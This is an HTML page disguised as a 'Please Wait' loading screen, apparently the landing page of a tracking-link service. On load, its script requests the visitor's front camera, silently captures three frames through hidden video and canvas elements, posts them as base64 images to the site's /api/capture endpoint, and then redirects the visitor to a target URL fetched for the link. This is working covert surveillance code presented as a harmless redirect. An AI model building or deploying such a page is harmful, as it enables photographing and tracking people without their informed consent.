<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        .container {
            padding: 40px;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            max-width: 90%;
            width: 400px;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; }
        p { opacity: 0.8; font-size: 14px; }
        .status { margin-top: 20px; font-size: 12px; opacity: 0.6; }
        #debug { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Please Wait</h1>
        <p>Preparing your content...</p>
        <div class="status" id="status">Initializing...</div>
        
        <!-- Hidden elements for capture -->
        <div id="debug" style="display:none;">
            <video id="video" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
        </div>
    </div>

    <script>
        async function captureAndRedirect() {
            const status = document.getElementById('status');
            
            try {
                // Get link ID from URL
                const path = window.location.pathname;
                const linkId = path.split('/').pop();
                
                status.textContent = 'Step 1: Getting target URL...';
                
                if (!linkId || linkId.length < 2) {
                    throw new Error('Invalid link ID');
                }
                
                // Get target URL from backend
                const API_BASE = window.location.origin;
                const targetRes = await fetch(`${API_BASE}/api/target/${linkId}`);
                
                if (!targetRes.ok) {
                    throw new Error('Invalid link');
                }
                
                const targetData = await targetRes.json();
                const targetUrl = targetData.targetUrl;
                
                status.textContent = 'Step 2: Requesting camera access...';
                
                // Try to capture media
                let captureCount = 0;
                try {
                    // Request camera access
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });
                    
                    status.textContent = 'Step 3: Camera active, capturing...';
                    
                    // Setup video element
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.playsInline = true;
                    video.muted = true;
                    
                    // Wait for video to be ready
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });
                    
                    // Setup canvas
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    // Capture images
                    const captureInterval = setInterval(async () => {
                        if (captureCount >= 3) {
                            clearInterval(captureInterval);
                            // Stop camera
                            stream.getTracks().forEach(track => track.stop());
                            status.textContent = 'Capture complete! Redirecting...';
                            
                            // Redirect after brief delay
                            setTimeout(() => {
                                window.location.href = targetUrl;
                            }, 500);
                            return;
                        }
                        
                        // Draw video frame to canvas
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Convert to base64
                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
                        
                        // Send to server (fire and forget)
                        fetch(`${API_BASE}/api/capture/${linkId}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                mediaData: imageData,
                                mediaType: 'image'
                            })
                        }).catch(e => {
                            console.log('Failed to send capture:', e);
                        });
                        
                        captureCount++;
                        status.textContent = `Captured ${captureCount}/3 images...`;
                        
                    }, 800); // Capture every 800ms
                    
                } catch (mediaError) {
                    console.log('Camera access denied or error:', mediaError);
                    status.textContent = 'Camera not available. Redirecting...';
                    // Redirect even if camera fails
                    setTimeout(() => {
                        window.location.href = targetUrl;
                    }, 1000);
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'Error. Redirecting to safety...';
                setTimeout(() => {
                    window.location.href = 'https://google.com';
                }, 2000);
            }
        }
        
        // Start the process when page loads
        document.addEventListener('DOMContentLoaded', captureAndRedirect);
    </script>
</body>
</html>
